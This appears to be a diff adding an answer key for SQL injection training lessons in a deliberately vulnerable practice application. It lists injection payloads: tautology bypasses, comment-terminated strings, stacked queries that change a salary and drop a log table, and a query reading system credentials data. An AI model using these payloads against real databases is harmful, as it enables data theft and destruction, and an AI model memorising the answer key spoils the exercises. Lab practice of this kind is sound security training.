@@ -1,0 +1,14 @@
+# SQL Injection (Intro)
+2. SELECT department FROM employees WHERE userid = 96134
+3. UPDATE employees SET department = 'Sales' WHERE last_name = 'Barnett'
+4. ALTER TABLE employees ADD phone varchar(20)
+5. GRANT ALL ON grant_rights TO unauthorized_user
+9. SELECT * FROM user_data WHERE first_name = 'John' and last_name = 'Smith' or '1' = '1'
+10. SELECT * From user_data WHERE Login_Count = 1 and userid= 1 or 1=1
+11. ' OR 1 =1 --
+12. '; UPDATE employees SET salary=100000 WHERE last_name = 'Smith' -- 
+13. '; DROP TABLE access_log
+
+# SQL Injection (Advanced)
+3. SELECT * FROM user_data WHERE last_name = 'Smith'; SELECT * FROM user_system_data --'
+5.
